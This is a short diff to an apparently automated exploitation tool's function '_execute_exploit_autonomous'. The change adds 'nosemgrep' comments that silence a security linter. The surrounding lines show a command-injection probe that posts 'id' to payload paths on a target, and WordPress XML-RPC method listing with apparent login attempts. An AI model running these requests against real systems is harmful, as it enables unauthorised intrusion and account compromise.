@@ -767,7 +767,7 @@ def _execute_exploit_autonomous(target_ip: str, exploit: dict, service: dict) ->
 
                 for payload in payloads:
                     try:
-                        resp = requests.post(
+                        resp = requests.post(  # nosemgrep: request-with-http
                             f"http://{target_ip}{payload}",
                             data="echo Content-Type: text/plain; echo; id",
                             timeout=5,
@@ -864,7 +864,7 @@ def _execute_exploit_autonomous(target_ip: str, exploit: dict, service: dict) ->
 
             try:
                 # Check if XML-RPC is enabled
-                resp = requests.post(
+                resp = requests.post(  # nosemgrep: request-with-http
                     f"http://{target_ip}/xmlrpc.php",
                     data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
                     headers={"Content-Type": "text/xml"},
@@ -884,7 +884,7 @@ def _execute_exploit_autonomous(target_ip: str, exploit: dict, service: dict) ->
                                 </params>
                             </methodCall>"""
 
-                            resp = requests.post(
+                            resp = requests.post(  # nosemgrep: request-with-http
                                 f"http://{target_ip}/xmlrpc.php",
                                 data=auth_xml,
                                 headers={"Content-Type": "text/xml"},
